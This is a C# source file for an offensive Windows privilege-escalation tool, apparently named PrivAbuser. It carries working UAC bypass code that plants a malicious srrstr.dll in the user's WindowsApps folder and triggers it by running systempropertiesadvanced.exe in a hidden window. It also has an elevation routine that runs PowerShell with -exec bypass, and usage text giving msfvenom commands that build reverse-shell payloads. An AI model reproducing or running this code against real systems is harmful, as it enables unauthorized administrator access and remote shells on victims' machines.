using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.Claims;
using Microsoft.Win32;

namespace PrivAbuser.Abuser
{
    public class UAC
    {
        public static void helper(string trigger)
        {
            if (trigger.Equals("elevate"))
            {
            Console.WriteLine("Usage: <exe> /elevate /exploit=<path_to_exploit>\n" +
                "Generator: msfvenom -p windows/shell_reverse_tcp lhost= lport -f exe -o rev443.exe\n" +
                "Example: <exe> /elevate /exploit=c:\\users\\public\\rev443.exe");
            }
            else if (trigger.Equals("bypassUAC"))
            {
                Console.WriteLine("Usage: <exe> /bypassUAC /exploit=<path_to_exploit>\n" +
                    "Generator: msfvenom -p windows/shell_reverse_tcp lhost= lport= -f dll -o srrstr.dll\n" +
                    "Example: <exe> /bypassUAC /exploit=c:\\users\\public\\rev443.dll");
            }
        }
        public static bool isAdministrator()
        {
            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(wi);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        public static bool isUACEnabled()
        {
            int value = (int)Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", null);
            if (value != 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static bool isInGroupAdministrators()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            List<Claim> claims = new List<Claim>(principal.UserClaims);
            Claim c = claims.Find(p => p.Value.Contains("S-1-5-32-544"));
            if (c != null) { return true; }
            else { return false; }
        }

        public static void bypass(string pathToExploit)
        {
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string target = String.Format("C:\\Users\\{0}\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll", userName.Split("\\".ToCharArray())[1]);
            Console.WriteLine("userName {0} target {1}", userName, target);
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = "cmd.exe";
            ps.WindowStyle = ProcessWindowStyle.Hidden;
            ps.Arguments = String.Format("/c copy {0} {1}", pathToExploit, target);
            Process.Start(ps);
            ps.Arguments = "/c c:\\windows\\syswow64\\systempropertiesadvanced.exe";
            Process.Start(ps);
        }

        public static void elevate(string pathToExploit)
        {
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = "powershell.exe";
            ps.WindowStyle = ProcessWindowStyle.Hidden;
            ps.Arguments = String.Format("-exec bypass -nop -c \"Start-Process powershell -Verb runAs {0}\"", pathToExploit);
            Process.Start(ps);
        }
    }
}
